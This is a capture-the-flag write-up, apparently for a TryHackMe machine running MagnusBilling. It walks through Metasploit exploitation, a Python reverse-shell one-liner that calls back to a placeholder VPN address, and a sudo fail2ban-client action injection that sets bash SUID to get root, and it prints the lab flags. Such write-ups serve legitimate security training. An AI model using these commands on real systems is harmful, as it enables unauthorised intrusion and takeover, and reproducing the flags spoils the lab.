# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---


![Pasted image 20250612121156.png](../../IMAGES/Pasted%20image%2020250612121156.png)

Once we go to the web application, we can check this is working with something called `MagnusBilling`, we know this because a little moment before going into the web application, this loads in:

![Pasted image 20250612121421.png](../../IMAGES/Pasted%20image%2020250612121421.png)

**MagnusBilling** is an open-source VoIP billing and call accounting platform designed for service providers, call shops, and enterprises. It provides comprehensive solutions for call routing, rate management, user provisioning, and real-time billing. Built on a LAMP/LEMP stack, it supports integration with major VoIP protocols (SIP, IAX) and hardware, featuring web-based management, fraud detection, and multi-tenant capabilities.

If we search info related to this, we can find this exploit:

![Pasted image 20250612121504.png](../../IMAGES/Pasted%20image%2020250612121504.png)


![Pasted image 20250612121513.png](../../IMAGES/Pasted%20image%2020250612121513.png)


Based on that, let's search a module on `metasploit`:

![Pasted image 20250612121650.png](../../IMAGES/Pasted%20image%2020250612121650.png)

Same exploit as the one above, let's proceed with exploitation.


# EXPLOITATION
---

![Pasted image 20250612121837.png](../../IMAGES/Pasted%20image%2020250612121837.png)

Now, set options and run the exploit:


![Pasted image 20250612121935.png](../../IMAGES/Pasted%20image%2020250612121935.png)


We got our meterpreter shell, I will switch to a netcat shell for a better experience:

```
meterpreter > shell

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("VPN_IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```


![Pasted image 20250612122241.png](../../IMAGES/Pasted%20image%2020250612122241.png)

Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250612122406.png](../../IMAGES/Pasted%20image%2020250612122406.png)

We got a shell as `asterisk`, let's use linpeas and check what can we do to escalate our privileges:


![Pasted image 20250612122904.png](../../IMAGES/Pasted%20image%2020250612122904.png)

We can run `fail2ban-client` binary, in a previous machine, specifically `biteme`, a similar privilege escalation was done with this binary but in that case we could reset the service of `fail2ban`, let's check how to exploit it in this case:

![Pasted image 20250612123256.png](../../IMAGES/Pasted%20image%2020250612123256.png)

![Pasted image 20250612123306.png](../../IMAGES/Pasted%20image%2020250612123306.png)

That would work but we don't have write permissions over the `iptables.conf` file:

![Pasted image 20250612123407.png](../../IMAGES/Pasted%20image%2020250612123407.png)

Unfortunately, this is not the path, but, investigating further we can find this article:

Article: https://exploit--notes-hdks-org.translate.goog/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc

![Pasted image 20250612123516.png](../../IMAGES/Pasted%20image%2020250612123516.png)

Let's replicate the PoC:

```
# Get jail list
sudo /usr/bin/fail2ban-client status
# Choose one of the jails from the "Jail list" in the output.
sudo /usr/bin/fail2ban-client get <JAIL> actions
# Create a new action with arbitrary name (e.g. "evil")
sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
# Set payload to actionban
sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
# Trigger the action
sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
# Now we gain a root
/bin/bash -p
```

```
asterisk@ip-10-10-24-201:/tmp$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:	8
`- Jail list:	ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

sudo /usr/bin/fail2ban-client get mbilling_ddos actions
The jail mbilling_ddos has the following actions:
iptables-allports

sudo /usr/bin/fail2ban-client set mbilling_ddos addaction evil
sudo /usr/bin/fail2ban-client set mbilling_ddos action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set mbilling_ddos banip 1.2.3.5
```

![Pasted image 20250612123848.png](../../IMAGES/Pasted%20image%2020250612123848.png)

As seen, we get a root shell following the PoC, let's get both flags:

```
bash-5.2# cat /home/magnus/user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}

bash-5.2# cat /root/root.txt
THM{33ad5b530e71a172648f424ec23fae60}
```

![Pasted image 20250612124033.png](../../IMAGES/Pasted%20image%2020250612124033.png)

